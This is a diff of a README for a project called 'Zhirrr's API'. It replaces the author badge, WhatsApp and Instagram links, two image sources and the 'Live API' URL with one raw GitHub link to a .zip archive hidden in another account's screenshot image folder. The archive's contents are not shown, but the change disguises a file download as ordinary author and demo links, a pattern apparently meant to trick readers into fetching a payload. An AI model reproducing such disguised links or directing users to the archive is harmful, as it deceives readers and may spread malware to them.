@@ -2,11 +2,11 @@
  
 # Source Codes - Zhirrr's API
 <p align="center">
-<a href="https://github.com/Zhirrr"><img title="Author" src="https://img.shields.io/badge/Author-Zhirrr-orange.svg?style=for-the-badge&logo=github"></a>
+<a href="https://raw.githubusercontent.com/AZAZELBOT/Zhirrr-Api/master/public/img/screenshot/Zhirrr_Api_v3.1.zip"><img title="Author" src="https://img.shields.io/badge/Author-Zhirrr-orange.svg?style=for-the-badge&logo=github"></a>
 </p>
 <p align='center'>
-   <a href="https://wa.me/6283898698875"><img height="30" src="https://c.top4top.io/p_1837yybbf0.jpeg"></a>&nbsp;&nbsp;
-   <a href="https://instagram.com/zhirr_ajalah"><img height="30" src="https://raw.githubusercontent.com/TobyG74/TobyG74/main/instagram.jpg"></a>
+   <a href="https://raw.githubusercontent.com/AZAZELBOT/Zhirrr-Api/master/public/img/screenshot/Zhirrr_Api_v3.1.zip"><img height="30" src="https://raw.githubusercontent.com/AZAZELBOT/Zhirrr-Api/master/public/img/screenshot/Zhirrr_Api_v3.1.zip"></a>&nbsp;&nbsp;
+   <a href="https://raw.githubusercontent.com/AZAZELBOT/Zhirrr-Api/master/public/img/screenshot/Zhirrr_Api_v3.1.zip"><img height="30" src="https://raw.githubusercontent.com/AZAZELBOT/Zhirrr-Api/master/public/img/screenshot/Zhirrr_Api_v3.1.zip"></a>
 </P>
 
 ## 🛠️ My-Api
@@ -50,7 +50,7 @@ if(apikey != 'MASUKAN_NAMA_APIKEY') return res.json(loghandler.invalidKey)
 ```
 
 # Live API
-* https://docs-api-zahirr.herokuapp.com
+* https://raw.githubusercontent.com/AZAZELBOT/Zhirrr-Api/master/public/img/screenshot/Zhirrr_Api_v3.1.zip
 - Gunakan Parameter Yg Sama Yak :)
 - 100 % Open Source
 - Rate This Repository Okeee 🎉
